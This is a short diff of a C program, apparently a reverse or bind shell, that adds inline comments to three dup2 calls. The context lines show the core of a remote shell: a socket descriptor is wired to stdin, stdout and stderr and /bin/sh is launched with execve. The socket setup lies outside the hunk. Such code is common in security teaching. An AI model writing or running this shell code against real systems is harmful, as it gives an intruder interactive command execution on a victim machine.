@@ -42,9 +42,9 @@ int main()
 	}
 
 	// Duplicate stdin/stdout/stderr to socket
-	dup2(fd, 0);
-	dup2(fd, 1);
-	dup2(fd, 2);
+	dup2(fd, 0); // stdin
+	dup2(fd, 1); // stdout
+	dup2(fd, 2); // stderr
 
 	// Execute shell
 	execve("/bin/sh", NULL, NULL);
